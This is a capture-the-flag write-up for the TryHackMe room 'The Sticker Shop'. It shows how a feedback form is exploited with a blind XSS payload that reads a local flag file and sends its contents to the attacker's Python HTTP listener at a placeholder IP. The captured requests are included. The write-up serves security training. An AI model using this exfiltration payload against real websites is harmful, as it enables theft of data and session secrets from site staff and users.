---
title: The Sticker Shop - tryhackme, toxicat0r
date: 2025-02-17 11:27:10 -5000
categories: [THM,Easy,Linux]
tags: [XSS,Web,Misconfiguration]
---

Can you exploit the sticker shop in order to capture the **flag**?
![TheStickerShop.png](Assets/Pictures/TheStickerShop/TheStickerShop.png)

Today, I'm going to solve The [The Sticker Shop](https://tryhackme.com/room/thestickershop) easy-level challenge.

---

## Description
Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

- Can you read the flag at `http://MACHINE_IP:8080/flag.txt?`

---

## Observations
The goal of The Sticker Shop challenge is to **exploit** the website and retrieve the **flag**.
The Sticker Shop website consists of **two** pages:
1. **Home Page:**
Features a simple interface displaying cat stickers with some basic styling.
![home-page.png](/Assets/Pictures/TheStickerShop/home-page.png)
No immediate vulnerabilities are visible here

2. **Submit Feedback Page:**
Contains a feedback form with a `textarea` where users can submit their feedback.
![feedback-page.png](/Assets/Pictures/TheStickerShop/feedback-page.png)
The form accepts data via a **POST** request to `/submit_feedback`.

---

## Initial Observations
At first glance, the Home Page appears harmless, with no obvious vulnerabilities. However, the `/submit_feedback` page could serve as a critical entry point for exploitation.

**Why?**

The feedback form accepts user-supplied input, making it a potential injection point for `XSS` attacks. If the input is not properly sanitized or validated, an attacker could inject malicious scripts, leading to:
- **Blind XSS** – The script triggers when an admin or user later views the stored **feedback**.

---

## Exploitation
To exfiltrate the flag, I crafted the Blind `XSS` payload:

````js
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));
    });
</script>
````
How It Works:
- The script fetches the contents of `/flag.txt` from the local server (`127.0.0.1:8080`).
- Once retrieved, it sends the flag as a GET request to your listener (`YOUR-IP-ADDRESS:8000`).

To intercept the flag, I set up a `Python HTTP server` on my machine.
````console
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
````
then i submitted the XSS payload through the feedback form.
![payload-inject.png](/Assets/Pictures/TheStickerShop/payload-inject.png)
Shortly after submission, my HTTP server captured the exfiltrated `flag` in an incoming `GET` request.
````console
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
"GET /?flag=THM[REDACTED] HTTP/1.1" 200 -
"GET /?flag=THM[REDACTED] HTTP/1.1" 200 -
````
With that, I retrieved the flag remotely,
![the-sticker-shop-solved.png](/Assets/Pictures/TheStickerShop/the-sticker-shop-solved.png)
completing [The Sticker Shop](https://tryhackme.com/room/thestickershop).

---

## Happy hacking !
Here are some resources:
* [https://www.geeksforgeeks.org/what-is-cross-site-scripting-xss/](https://www.geeksforgeeks.org/what-is-cross-site-scripting-xss/)
* [https://www.geeksforgeeks.org/what-is-cross-site-scripting-xss/](https://www.geeksforgeeks.org/what-is-cross-site-scripting-xss/)